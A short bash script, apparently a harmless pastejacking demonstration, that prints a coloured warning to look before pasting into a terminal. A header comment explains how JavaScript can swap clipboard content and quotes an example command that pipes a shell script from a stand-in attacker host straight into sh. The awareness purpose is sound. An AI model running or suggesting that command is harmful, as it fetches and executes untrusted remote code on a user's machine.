#!/bin/bash

#  Hello there!
#  People have found an exploit in JavaScript which works as "intended", basically copying something else to the clipboard, than what you actually look like you copy.
#  
#  For example you could want to copy 'sudo apt update' from the command line, but end up copying 
#  'curl http://attacker-domain:8000/shell.sh | sh\n'
#  
#  This script will contain this exploit, but will warn users instead.
#

#echo ""
#echo "TEXT COLOR"
#echo -e "\e[1;31m RED \e[0m"
#echo -e "\e[1;32m GREEN \e[0m"
#echo -e "\e[1;33m YELLOW \e[0m"
#echo -e "\e[1;34m BLUE \e[0m"
#echo -e "\e[1;35m MAGENTA \e[0m"
#echo -e "\e[1;36m CYAN \e[0m"
#echo ""
#echo "BACKGROUND COLOR"
#echo -e "\e[1;41m RED \e[0m"
#echo -e "\e[1;42m GREEN \e[0m"
#echo -e "\e[1;43m YELLOW \e[0m"
#echo -e "\e[1;44m BLUE \e[0m"
#echo -e "\e[1;45m MAGENTA \e[0m"
#echo -e "\e[1;46m CYAN \e[0m"
#echo ""

echo -e "\e[41;5m WARNING \e[0m  LOOK BEFORE YOU PASTE!  \033[41;5m WARNING \e[0m"
echo -e ""
echo -e "When you copy and pasted something, it could have been malicious code!"
echo -e "Next time, paste into a notepad application, before pasting into a terminal or website!"
echo -e ""
echo -e "\e[41;5m WARNING \e[0m  LOOK BEFORE YOU PASTE!  \033[41;5m WARNING \e[0m"
